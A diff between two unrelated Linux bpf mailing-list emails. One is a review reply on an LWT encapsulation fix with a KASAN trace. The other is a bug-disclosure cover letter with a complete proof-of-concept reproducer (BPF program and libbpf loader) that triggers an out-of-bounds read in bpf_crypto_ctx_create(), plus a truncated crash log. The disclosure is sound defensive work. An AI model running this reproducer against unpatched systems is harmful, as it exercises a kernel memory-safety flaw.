@@ -1,253 +1,396 @@
-Received: from mail-ed2-f37.google.com (mail-ed2-f37.google.com [74.125.228.101])
+Received: from mail-pz2-f42.google.com (mail-pz2-f42.google.com [74.125.228.42])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E3D0654705C
-	for <bpf@vger.kernel.org>; Sat, 19 Sep 2026 08:23:17 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=74.125.228.101
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1789806199; cv=pass; b=hh2c1L6UScl6oCR1wgxVTshFjjUhR1OoWraNE0C3DnJ3tgSIDHMQe0xoEP+kQ8JUkm1Eba0IGHQ3eygCGK3DxVOjgt0zvxuOr6BsbdzDgrjGdZst2DI4Hlsg3paFE9I34IXGd0E0fU35RPVigpm1TqmJl/YKY5nfvCyBiTrHDRI=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1789806199; c=relaxed/simple;
-	bh=kk4x1LYc907tCEo0ovqTiZfCVDl9FyDlgEWQ0QccuFY=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=Tx8APR4fVJHAu6VEoUJORdeWzzOsn6zrLVOjWTO/p5jp1bG2nND2FfjTzCxiE0BoPmHD3CmcHxKaiBB9+kXVnuEIQSbZAItg9wbFnmZSuFalxqM5BrCD3mUuEJPFKq42fSPFWWFsyeAFzaTMcMxwZkCzR93ak/Mic8mXTe1s4yw=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=Fa1ATDn5; arc=pass smtp.client-ip=74.125.228.101
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E1D8136B91D
+	for <bpf@vger.kernel.org>; Sat, 19 Sep 2026 08:45:19 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.42
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1789807522; cv=none; b=odNyiRoKnsazkkqsF4tROMK03+Jg7TJmNJlDok/so9TeAtv2x+J3+IqGofYiRu3LJQ1q0ki8F1opCaYrEYfSrXCpXQnH5/2/9BOlvwbuinzbWsYXFC4iyMQBvsAauLEcRvrcTN93mQhEiSxO3M70jhL15A3Dw9FzNSDpfT/PlIg=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1789807522; c=relaxed/simple;
+	bh=4I980kICvyABLqVpqDqSgEeu/U+q8Dzz8HYc8L10P5w=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=AS9e1dnuCsxHLr1Gso4ovejguvw4PRxncMChmQtC3MSduSiwDm1AZEPV+Nt+0hf8jPDcrD3GgIH1ItlHff9YBXmxmu0bBXQkt1R98yfgkC2V2Lvh7T/Xe2wDgaTIJaWX4J9xvSM7NOVyrOtSCEwbivNtTlZQkyt1acODuAcNB0k=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=VIrROkW4; arc=none smtp.client-ip=74.125.228.42
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="Fa1ATDn5"
-Received: by mail-ed2-f37.google.com with SMTP id 4fb4d7f45d1cf-6a9984f9a59so2123955a12.0
-        for <bpf@vger.kernel.org>; Sat, 19 Sep 2026 01:23:17 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1789806196; cv=none;
-        d=google.com; s=arc-20260327;
-        b=IN6rejzxFDXSYbQEbnV9mJ8JXN9lsYE7n891HAN1kafZl/DH/7mxgivWY6LmbAl9NS
-         lNdsF89LQ1HkIR4MJc3J6STpsBKz0uRyjRQt8EEkEoGDh+iL6f+y+nIxi5WXb7KYRQqs
-         +qC9FKlPwqyiSUTlaf1Jjj2lBKX4AqcgkXo4DMivKoPFI5qvHghRbFw8XxHfigMMuoRP
-         avykGa5H+ti3b0J5ZeWvNMrGw/RKCMcy4QK/a/Fsc2ms8yxf9rhFFCwRt2j+6/YAM5pZ
-         Z6k0jkZ52wX0QAyJZdYzpwxGL8NbN+caFNkVSy8rwTROth4nwMJCaKjY/FhHkzL7Uau4
-         Zgqw==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:dkim-signature;
-        bh=vhlRYBu557OkzNkvBXKWSwkb6fE3+wI2R2RMdVzmiUI=;
-        fh=hNeSAL3+zSFu0OQnkLI9iiIpnwtcEk7JWYJThBI6Kao=;
-        b=JIM5qBD6gk5pe0JeC+YIp6G7okAY/abEOKcjrSiNcsPIiRsAbEo2fTxmqzI7ia4/Kt
-         fiAIhzrPwErsHQvne7zl/k3zae0/f020JrauxeCy3ppjeGrTitj8xkANnqv3scuvPmao
-         VPKVlIfqUfhaCZsGJ6OJJ2Eum4PVxehiqbnBh8xiaoPbGNfs1CCGX7eWEpOuZmD9d/eB
-         IAZJ0TNI2/C/hIphgAks9n2KV0gpiE30sXCytn8rBRgf01Cl4TgtvB/RQVPM7uEJrmxi
-         gmhuVTKtjBmoHkNtj5SStAnV5eof0JT9HCkGND8/T+w/lgxcrc2Hc5bAi7RhsHunCUvR
-         yTRg==;
-        darn=vger.kernel.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="VIrROkW4"
+Received: by mail-pz2-f42.google.com with SMTP id 41be03b00d2f7-cc1cebcb8d7so472146a12.0
+        for <bpf@vger.kernel.org>; Sat, 19 Sep 2026 01:45:19 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1789806196; x=1790410996; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=vhlRYBu557OkzNkvBXKWSwkb6fE3+wI2R2RMdVzmiUI=;
-        b=Fa1ATDn5/hpo3E3bZ3UJDa26K7g9kNssTiX4Ia8+sElZIZcbH/J+IP1vSBax9E/W5L
-         tEUcTfM+Nf7JIpnlMhk8dvE/hGhfHbQSw9RdRYrGF4SmbpUCP31mcMPzYUajQi3w4a1O
-         PI3ouqVq7EYWAlPLvj5PQhQLSoFAhLmkcTAHpDwvzPXXaR7DdaMRZPOkUw3APGuc0lDA
-         KM0lIZ0W9UVChnbn4Qbibvpj4OPBW29FuGQ5EqjBh9gk31yRhpyWGRYuvhDpGcJfDiiu
-         /uZEKiy6BieqZIBadSAKiIyPMUclebG5rwRhiD7QB/zbrK++h12E3WVxMmKTc66P9HrR
-         +tqQ==
+        d=gmail.com; s=20251104; t=1789807519; x=1790412319; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=1l8TrkXbGJ71DiS4SFI2tBmgmGTmPnfE0B+GQalRacA=;
+        b=VIrROkW4YAsVvZjNoZFALa79NZM5RRdKR6C6jRVu+Ic0VOEDAO8QBIGgM/6EqlJ8Qt
+         D8TRpZKb9F6r1a9FhSFp7C7IZsY/eOIXMjAOLNGnZR8Ut+rSddj/n5Qpoj3MB2kie6e9
+         7zul4gyodlad4sMecOtNht2Hthz6ZsP7bk1EUKnPtlUgE+LgoEAauxw3cKaAOnWpkPP8
+         WXDV8w2FLaIicKKtsW+rAgB7LoYNbcdP3fFIe9IHYrtdW1siShMWJEW3hDWYM2HPDP6q
+         TUtZvazaJs7aKzyVZc5o81WNKb7yHjFhnCtKDCFU+SPgN0a+yur8O1K3/JKdw1raBAM5
+         WE9A==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1789806196; x=1790410996;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=vhlRYBu557OkzNkvBXKWSwkb6fE3+wI2R2RMdVzmiUI=;
-        b=lmux9sy7MoFbOV6rw5IDGtPosi4jGVFdJge3/anFykXoIyFzrWQKg9lHFjRseLoHEM
-         HZAdMXgpFx2PmNghVZNxwd823W/tCVHk1poNEj2Hh3Tw4CM+0yalIobCqKVUT5YMkb9E
-         Et5W6bwMibtJYQqBR6X+WzZ2kR15ulEqAyPmB6iqRlOnjXtqIkBoNJVMTKlSwCYqbH5Z
-         61leJ0Hz67XY9CyMmfoGvpey07PvvSx58wnFll1omdwsRgyrw2oBb/uqK5LGfxhRLzyJ
-         AfBr3v4e8SR3/0Li8+Rq5fMU6UhU07M1+NbZ5CSxySzlgYfUo1XHw3j2uFA08tV4v795
-         sdvg==
-X-Forwarded-Encrypted: i=1; AKwUvBylMWRJiu+yR8vCApTSKw5oFUCRK+dep117hu7cWheZXZYJMoKlkGrSJf+/8fGNJgzQynI=@vger.kernel.org
-X-Gm-Message-State: AFuF++kAHBi09mu3jCHWw6Dn/f87HFvxrdmCciOZYryZtL/q527YrYd5
-	j3rUS6fmOPmaR/SpaTrEvYN2AuYF8mcfEC/JQbVlN/GHpOoKGtzLRSFzo18gaxNaIcVgCGoYo0F
-	tJGkSA07CT3zgZJa+oBlw7IVPGtIj/bk=
-X-Gm-Gg: AYBFou00wGnWbV7fnrNzkjoCp+0xUTd935Gdw9OrWRPgfe/eeTsanvEC9CBzbZmErfs
-	vr0Aybx202mnTotx4Jka88n2DDaRqZc2XELWxWdyS2Tix+Cq4EmkitbiVW+XINU+fVzAA9+sLIO
-	WA7J9B0kydRdc5g5fETxU6SNEc2qqtZzzeMpMOesy7o6TWtEWSpBqvuajsJHPBZKEY6s5U80gF7
-	+4DW3wuQlpwJBPp9lSAEaQDH1fOf0iGrAsf1LYHv/kpqTazmK4Q/DALPSIJR/BPIwvhLkHpj8oP
-	dLCVnroAGEo4rRq+OIX4Ua14EsCUmKzfyjnwWTUz0pagKw1DneOtIaKOohj+ZuotZYqY97Nf0Kw
-	A8BU3MR1khI47
-X-Received: by 2002:a05:6402:5111:b0:6a9:ab6a:640f with SMTP id
- 4fb4d7f45d1cf-6aa531c28c8mr3352559a12.37.1789806195879; Sat, 19 Sep 2026
- 01:23:15 -0700 (PDT)
+        d=1e100.net; s=20260707; t=1789807519; x=1790412319;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=1l8TrkXbGJ71DiS4SFI2tBmgmGTmPnfE0B+GQalRacA=;
+        b=RNStrIXNRTvpoptxtHnRzBx6RbHCH0xZbfL2ELeLky8EyYHsMY1Wqf7aN31AlBj1zs
+         nEQEwdgBc7PdBT3prSQohXgh82tNaLeaGFejB7aeY1v58No/iBxphVbTHsHAPUGBK9BJ
+         nRBzMRnAOBPJJflEvSSrXrXN1FODsCwATXRnchViYLQvFNI4gOREpLuZAvha/pyFjL/W
+         tI0566ZqpJzK0PyYedkYIl2JZkZuKJGWh+fGUQ3CgGB2OwdX2KJKgrncSW9K1s0CSXKT
+         uE9vq0VznqNsNPrCsBC4DFEcIByuk4u09WV2m58cfjBEAUZke3raH0TuDhoili80WnCd
+         Y64A==
+X-Gm-Message-State: AFuF++kOM8S7SfzQT2MrdpsWG6sbBEvPiSs/+iE3aFYkzBHd/ivMlz+D
+	udbKGanGHUSB9s31YLDByB+YqcY/68ljOtRzopshoigZ1KbGcJoEpDy/lNpwwPz42k/5/+4gKHU
+	=
+X-Gm-Gg: AYBFou3RNqvsDmrnfTQ7kO8SnWmcyzNAHaGcF4pqHmSgxOyA6PZ5TmRUmLevQZHZaJV
+	maDFxCZukCmg1Xa7lBcLB1LyWvnQykSJ4f4aENodeaggBzU/wqvRrsLqDXZIx57h0DUdveMB2K4
+	us94HoK3KoWG4qvS/t3yBrfWeiNvh7is43PD9cUSi26batOO6vz5qrvDBvemMM6W62T4TKl27dV
+	f1clm0HnkS+C+C7al72BO8PgfvMewUzGWlNxwr5KXYS8GdObJFmKq6/6pCXDbLpB42JaE5GGHJl
+	vd8VAyCScWgHCjP/7S0TQhdEgfhI0OxFWcnJpuYoH0Ym70pqysdRvkFq24lImSRhoOYJBfX6IMa
+	p3PD9ZSElxEceLZRNUz3sEDNSCGORU9SDluatCvCjGemDlXe2PesJhwCTDqQHYtoBlrZvArCO+b
+	2rT0/DatoqS301ANL1Y0k3RIVUvWChKhNw8O1klOnJ+TL41/1itSWwjvlcmhwNldRL0pCNirSnh
+	IKfImrIQ0hSywlWISMeiez6PYE6PnRCEtF2JNtvaAQtzIKa5gNi2+yBFsNghVbtziGqRg==
+X-Received: by 2002:a17:90b:2249:b0:398:9bd3:d6d4 with SMTP id 98e67ed59e1d1-39e556ad1f9mr5359135a91.14.1789807519032;
+        Sat, 19 Sep 2026 01:45:19 -0700 (PDT)
+Received: from lenovo-thinkbook (42-2-127-248.static.netvigator.com. [42.2.127.248])
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39e6ca4ef3esm3556837a91.1.2026.09.19.01.45.13
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Sat, 19 Sep 2026 01:45:18 -0700 (PDT)
+From: Yuqi Xu <xuyuqiabc@gmail.com>
+To: bpf@vger.kernel.org
+Cc: Vadim Fedorenko <vadim.fedorenko@linux.dev>,
+	Alexei Starovoitov <ast@kernel.org>,
+	Daniel Borkmann <daniel@iogearbox.net>,
+	Andrii Nakryiko <andrii@kernel.org>,
+	Eduard Zingerman <eddyz87@gmail.com>,
+	Kumar Kartikeya Dwivedi <memxor@gmail.com>,
+	Martin KaFai Lau <martin.lau@linux.dev>,
+	Song Liu <song@kernel.org>,
+	Yonghong Song <yonghong.song@linux.dev>,
+	Jiri Olsa <jolsa@kernel.org>,
+	Emil Tsalapatis <emil@etsalapatis.com>,
+	Ihor Solodrai <ihor.solodrai@linux.dev>,
+	stable@vger.kernel.org,
+	Vega <vega@nebusec.ai>,
+	Ren Wei <weir@nebusec.ai>,
+	xuyq21@lenovo.com
+Subject: [PATCH bpf 0/1] bpf: crypto: check params size before reading reserved fields
+Date: Sat, 19 Sep 2026 16:45:01 +0800
+Message-ID: <cover.1789802413.git.xuyuqiabc@gmail.com>
+X-Mailer: git-send-email 2.55.0
 Precedence: bulk
 X-Mailing-List: bpf@vger.kernel.org
 List-Id: <bpf.vger.kernel.org>
 List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <20260916170406.1280954-2-bestswngs@gmail.com> <48990076-414c-4196-99b9-86fce41b8054@iogearbox.net>
- <97695bef-507a-403a-84ae-c2e222b3dc65@iogearbox.net>
-In-Reply-To: <97695bef-507a-403a-84ae-c2e222b3dc65@iogearbox.net>
-From: Weiming Shi <bestswngs@gmail.com>
-Date: Sat, 19 Sep 2026 16:22:39 +0800
-X-Gm-Features: AcwNN1U6CAvWtS7Q9Hn-LstPLSzG1EhMZ9wcKAF-zq7_4r0l3w8GEVySnFsv_ws
-Message-ID: <CANgPUi2g4HiCi1dVw+Xpoed7UJJakSiuaFLxToTNO595osed6w@mail.gmail.com>
-Subject: Re: [PATCH v2] bpf: clear stale IPv4 options after LWT encapsulation
-To: Daniel Borkmann <daniel@iogearbox.net>
-Cc: Alexei Starovoitov <ast@kernel.org>, Andrii Nakryiko <andrii@kernel.org>, 
-	Eduard Zingerman <eddyz87@gmail.com>, Kumar Kartikeya Dwivedi <memxor@gmail.com>, 
-	Martin KaFai Lau <martin.lau@linux.dev>, Song Liu <song@kernel.org>, 
-	Yonghong Song <yonghong.song@linux.dev>, Jiri Olsa <jolsa@kernel.org>, 
-	Emil Tsalapatis <emil@etsalapatis.com>, Ihor Solodrai <ihor.solodrai@linux.dev>, 
-	John Fastabend <john.fastabend@gmail.com>, "David S . Miller" <davem@davemloft.net>, 
-	Eric Dumazet <edumazet@google.com>, Jakub Kicinski <kuba@kernel.org>, Paolo Abeni <pabeni@redhat.com>, 
-	Simon Horman <horms@kernel.org>, bpf@vger.kernel.org, linux-kernel@vger.kernel.org, 
-	netdev@vger.kernel.org, Peter Oskolkov <posk@google.com>, Xiang Mei <xmei5@asu.edu>, 
-	stable@vger.kernel.org
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+Content-Transfer-Encoding: 8bit
 
-Daniel Borkmann <daniel@iogearbox.net> =E4=BA=8E2026=E5=B9=B49=E6=9C=8818=
-=E6=97=A5=E5=91=A8=E4=BA=94 02:54=E5=86=99=E9=81=93=EF=BC=9A
->
-> On 9/17/26 8:24 PM, Daniel Borkmann wrote:
-> > On 9/16/26 7:04 PM, Weiming Shi wrote:
-> >> bpf_lwt_push_ip_encap() rebases the network header after prepending an=
- IP
-> >> header, but leaves IPCB(skb)->opt describing the inner IPv4 header.  A=
-n
-> >> ingress LWT route can consequently make an ICMP error interpret an
-> >> inner-header byte as an option length and copy 255 bytes into 40 bytes=
- of
-> >> stack storage.  The trace decoded with scripts/decode_stacktrace.sh is=
-:
-> >>
-> >>    BUG: KASAN: stack-out-of-bounds in __ip_options_echo
-> >>    Write of size 255
-> >>    Call Trace:
-> >>     <IRQ>
-> >>     __asan_memcpy (mm/kasan/shadow.c:106)
-> >>     __ip_options_echo (net/ipv4/ip_options.c:96)
-> >>     __icmp_send (net/ipv4/icmp.c:949)
-> >>     ip_forward (net/ipv4/ip_forward.c:176)
-> >>     lwtunnel_input (net/core/lwtunnel.c:465)
-> >>     ip_rcv (net/ipv4/ip_input.c:612)
-> >>     __netif_receive_skb_one_core (net/core/dev.c:6264)
-> >>     process_backlog (net/core/dev.c:6728)
-> >>     __napi_poll (net/core/dev.c:7787)
-> >>     net_rx_action (net/core/dev.c:8007)
-> >>     handle_softirqs (kernel/softirq.c:645)
-> >>     do_softirq.part.0 (kernel/softirq.c:546)
-> >>     </IRQ>
-> >>     <TASK>
-> >>     __local_bh_enable_ip (kernel/softirq.c:473)
-> >>     __dev_queue_xmit (net/core/dev.c:4961)
-> >>     packet_sendmsg (net/packet/af_packet.c:3143)
-> >>     __sys_sendto (net/socket.c:2281)
-> >>     __x64_sys_sendto (net/socket.c:2288)
-> >>     do_syscall_64 (arch/x86/entry/syscall_64.c:84)
-> >>     entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
-> >>     </TASK>
-> >>
-> >> A helper-only reset can be restored by bpf_prog_run_save_cb(), while a
-> >> program without ctx->cb[] access can clone-redirect the skb before a
-> >> return-only reset.  Track active LWT runs and their control-block fami=
-ly
-> >> in the BPF network context.  When the control block is not BPF scratch
-> >> space, save its original contents and reset it immediately so clones s=
-ee
-> >> the new-family layout.  After the program returns, restore that snapsh=
-ot
-> >> when the verdict continues through the original protocol callback, the=
-n
-> >> invalidate the stale header metadata.  Verdicts that reroute or redire=
-ct
-> >> keep the new-family layout.
-> >>
-> >> Preserve the state across nested runs and retain the ingress interface=
- and
-> >> L3-slave state when the protocol family changes.
-> >>
-> >> Cc: stable@vger.kernel.org
-> >> Fixes: 52f278774e79 ("bpf: implement BPF_LWT_ENCAP_IP mode in bpf_lwt_=
-push_encap")
-> >> Reported-by: Xiang Mei <xmei5@asu.edu>
-> >> Assisted-by: LLM
-> >> Signed-off-by: Weiming Shi <bestswngs@gmail.com>
-> >> ---
-> >> v2:
-> >> - Save the incoming protocol control block for programs without ctx->c=
-b[]
-> >>    access.
-> >> - Restore that snapshot before a verdict continues through the origina=
-l
-> >>    protocol callback, then invalidate the rebased header metadata.
-> >> - Keep the eager new-family reset for clones and final reroute/redirec=
-t
-> >>    consumers.
-> >> - Add Cc: stable@vger.kernel.org.
-> >> - Correct the patch author and reporter attribution.
-> >> v1:
-> >> - https://lore.kernel.org/bpf/20260915170147.3943392-2-bestswngs@gmail=
-.com/
-> >
-> > Hm, this is way too much fragile churn for a feature which I'm not sure=
- is much
-> > used (?). Can't we just save/restore the skb->cb when the BPF prog runs=
-? Roughly
-> > sth along these lines (untested) :
-> >
-> > diff --git a/net/core/lwt_bpf.c b/net/core/lwt_bpf.c
-> > index da49364ec63d..9cf04b44ecc1 100644
-> > --- a/net/core/lwt_bpf.c
-> > +++ b/net/core/lwt_bpf.c
-> > @@ -36,10 +36,24 @@ static inline struct bpf_lwt *bpf_lwt_lwtunnel(stru=
-ct lwtunnel_state *lwt)
-> >   #define NO_REDIRECT false
-> >   #define CAN_REDIRECT true
-> >
-> > +static void bpf_lwt_reset_cb(struct sk_buff *skb)
-> > +{
-> > +    if (skb->protocol =3D=3D htons(ETH_P_IP)) {
-> > +        memset(IPCB(skb), 0, sizeof(*IPCB(skb)));
-> > +        IPCB(skb)->iif =3D skb->skb_iif;
-> > +    } else if (skb->protocol =3D=3D htons(ETH_P_IPV6)) {
-> > +        memset(IP6CB(skb), 0, sizeof(*IP6CB(skb)));
-> > +        IP6CB(skb)->iif =3D skb->skb_iif;
-> > +        IP6CB(skb)->nhoff =3D offsetof(struct ipv6hdr, nexthdr);
-> > +    }
-> > +}
-> > +
-> >   static int run_lwt_bpf(struct sk_buff *skb, struct bpf_lwt_prog *lwt,
-> >                  struct dst_entry *dst, bool can_redirect)
-> >   {
-> >       struct bpf_net_context __bpf_net_ctx, *bpf_net_ctx;
-> > +    bool encap =3D skb->encapsulation;
-> > +    u8 cb_saved[BPF_SKB_CB_LEN];
-> >       int ret;
-> >
-> >       /* Disabling BH is needed to protect per-CPU bpf_redirect_info be=
-tween
-> > @@ -48,7 +62,12 @@ static int run_lwt_bpf(struct sk_buff *skb, struct b=
-pf_lwt_prog *lwt,
-> >       local_bh_disable();
-> >       bpf_net_ctx =3D bpf_net_ctx_set(&__bpf_net_ctx);
-> >       bpf_compute_data_pointers(skb);
-> > +
-> > +    memcpy(cb_saved, bpf_skb_cb(skb), sizeof(cb_saved));
-> >       ret =3D bpf_prog_run_save_cb(lwt->prog, skb);
-> > +    memcpy(bpf_skb_cb(skb), cb_saved, sizeof(cb_saved));
->
-> ... also needs BPF selftests obviously; dropping the memcpy and a closer =
-look wrt
-> freplace, whether we should reuse & propagate ->cb_access=3D1 also from t=
-here.
->
-> > +    if (!encap && skb->encapsulation)
-> > +        bpf_lwt_reset_cb(skb);
-> >
-> >       switch (ret) {
-> >       case BPF_OK:
->
+Hi Linux kernel maintainers,
 
-Hi,
-Thanks for the suggestion. I'll simplify the fix, handle cb_access for
-freplace, add BPF selftests, and send a v3.
+We found and validated an issue in kernel/bpf/crypto.c.  The reproducer
+below runs as root because loading a BPF_PROG_TYPE_SYSCALL program is
+gated by bpf_capable(), so a user namespace is not sufficient.
+
+We've tested it, and it should not affect any other functionality.
+
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
+
+---- details below ----
+
+Bug details:
+
+bpf_crypto_ctx_create() takes params with the kfunc __sz annotation, so
+the verifier only guarantees that params__sz bytes of the buffer are
+valid.  The function first reads params->reserved[0] and
+params->reserved[1] (offsets 14 and 15) and only then compares
+params__sz with sizeof(struct bpf_crypto_params).  A BPF program can
+therefore pass a shorter buffer and make the kernel read past the
+validated region.
+
+The PoC uses a BPF_PROG_TYPE_SYSCALL program with a 1-byte hash map
+value and passes params__sz = 1.  The map is created with
+BPF_F_NO_PREALLOC so that each element is a separate kmalloc object and
+KASAN can see the overrun; with the default preallocated hash map the
+elements share one large allocation and the same read lands in adjacent
+memory without a report.
+
+The patch moves the size comparison in front of the reserved field
+reads, so the out-of-bounds read cannot happen anymore.  Valid
+parameters behave exactly as before: with the patch applied, a program
+that passes a full-size valid struct still creates a crypto context.
+
+Reproducer:
+
+The kernel must be built with CONFIG_BPF_SYSCALL, CONFIG_BPF_JIT,
+CONFIG_DEBUG_INFO_BTF, CONFIG_CRYPTO_SKCIPHER2 and CONFIG_KASAN, and
+booted with panic_on_warn=1.
+
+  clang -target bpf -O2 -g -D__TARGET_ARCH_x86 -c poc.bpf.c -o poc.bpf.o
+  # build libbpf from tools/lib/bpf, then link the userspace part:
+  gcc -O2 -o poc poc.c -lbpf -lelf -lz -lzstd
+  ./poc
+
+We run the PoC in a 4 vCPU, 6 GB RAM x86 QEMU/KVM environment as root
+(CAP_BPF in the initial user namespace).
+
+------BEGIN poc.bpf.c------
+
+#include <linux/types.h>
+#include <linux/bpf.h>
+#include <bpf/bpf_helpers.h>
+
+struct bpf_crypto_ctx {};
+
+struct bpf_crypto_params {
+	char type[14];
+	__u8 reserved[2];
+	char algo[128];
+	__u8 key[256];
+	__u32 key_len;
+	__u32 authsize;
+};
+
+struct {
+	__uint(type, BPF_MAP_TYPE_HASH);
+	__uint(max_entries, 1);
+	__uint(map_flags, BPF_F_NO_PREALLOC);
+	__type(key, __u32);
+	__type(value, __u8);
+} tiny_map SEC(".maps");
+
+struct bpf_crypto_ctx *bpf_crypto_ctx_create(const struct bpf_crypto_params *params,
+					     __u32 params__sz, int *err) __ksym;
+void bpf_crypto_ctx_release(struct bpf_crypto_ctx *ctx) __ksym;
+
+SEC("syscall")
+int trigger(void *ctx)
+{
+	__u32 key = 0;
+	__u8 *params;
+	int err = 0;
+	struct bpf_crypto_ctx *cctx;
+
+	params = bpf_map_lookup_elem(&tiny_map, &key);
+	if (!params)
+		return 1;
+
+	cctx = bpf_crypto_ctx_create((const struct bpf_crypto_params *)params, 1, &err);
+	if (cctx)
+		bpf_crypto_ctx_release(cctx);
+	return err;
+}
+
+char _license[] SEC("license") = "GPL";
+
+------END poc.bpf.c--------
+
+------BEGIN poc.c------
+
+#include <errno.h>
+#include <stdio.h>
+#include <stdarg.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/resource.h>
+#include <bpf/libbpf.h>
+#include <bpf/bpf.h>
+
+static int libbpf_print_fn(enum libbpf_print_level level, const char *fmt, va_list args)
+{
+	if (level == LIBBPF_DEBUG)
+		return 0;
+	return vfprintf(stderr, fmt, args);
+}
+
+int main(void)
+{
+	char log_buf[1 << 20] = {};
+	struct bpf_object_open_opts open_opts = {
+		.sz = sizeof(open_opts),
+		.kernel_log_buf = log_buf,
+		.kernel_log_size = sizeof(log_buf),
+		.kernel_log_level = 1,
+	};
+	struct rlimit rlim = {
+		.rlim_cur = RLIM_INFINITY,
+		.rlim_max = RLIM_INFINITY,
+	};
+	struct bpf_object *obj = NULL;
+	struct bpf_map *map;
+	struct bpf_program *prog;
+	struct bpf_test_run_opts opts;
+	__u32 key = 0;
+	__u8 value = 0;
+	int prog_fd;
+	int map_fd;
+	int err;
+
+	libbpf_set_print(libbpf_print_fn);
+	setrlimit(RLIMIT_MEMLOCK, &rlim);
+
+	obj = bpf_object__open_file("./poc.bpf.o", &open_opts);
+	if (!obj) {
+		fprintf(stderr, "open failed\n");
+		return 1;
+	}
+
+	bpf_object__for_each_program(prog, obj)
+		bpf_program__set_log_level(prog, 2);
+
+	err = bpf_object__load(obj);
+	if (err) {
+		fprintf(stderr, "load failed: %d (%s)\n", err, strerror(-err));
+		if (log_buf[0])
+			fprintf(stderr, "%s\n", log_buf);
+		goto out;
+	}
+
+	map = bpf_object__find_map_by_name(obj, "tiny_map");
+	if (!map) {
+		err = -ENOENT;
+		fprintf(stderr, "map not found\n");
+		goto out;
+	}
+
+	map_fd = bpf_map__fd(map);
+	err = bpf_map_update_elem(map_fd, &key, &value, BPF_ANY);
+	if (err) {
+		err = -errno;
+		fprintf(stderr, "map update failed: %d (%s)\n", err, strerror(errno));
+		goto out;
+	}
+
+	prog = bpf_object__find_program_by_name(obj, "trigger");
+	if (!prog) {
+		err = -ENOENT;
+		fprintf(stderr, "program not found\n");
+		goto out;
+	}
+
+	prog_fd = bpf_program__fd(prog);
+	memset(&opts, 0, sizeof(opts));
+	opts.sz = sizeof(opts);
+	err = bpf_prog_test_run_opts(prog_fd, &opts);
+	if (err) {
+		err = -errno;
+		fprintf(stderr, "test run failed: %d (%s)\n", err, strerror(errno));
+		goto out;
+	}
+
+	fprintf(stderr, "test run ok, retval=%u\n", opts.retval);
+	err = 0;
+out:
+	bpf_object__close(obj);
+	return err ? 1 : 0;
+}
+
+------END poc.c--------
+
+-----BEGIN crash log----
+
+[    1.544932] ==================================================================
+[    1.544942] BUG: KASAN: slab-out-of-bounds in bpf_crypto_ctx_create+0x811/0xaf0
+[    1.544950] Read of size 1 at addr ffff888102fbee4e by task poc.static/92
+[    1.544954] 
+[    1.544958] CPU: 1 UID: 0 PID: 92 Comm: poc.static Not tainted 7.3.0-rc2-00040-gb4e875d397da #1 PREEMPT(lazy) 
+[    1.544962] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
+[    1.544965] Call Trace:
+[    1.544968]  <TASK>
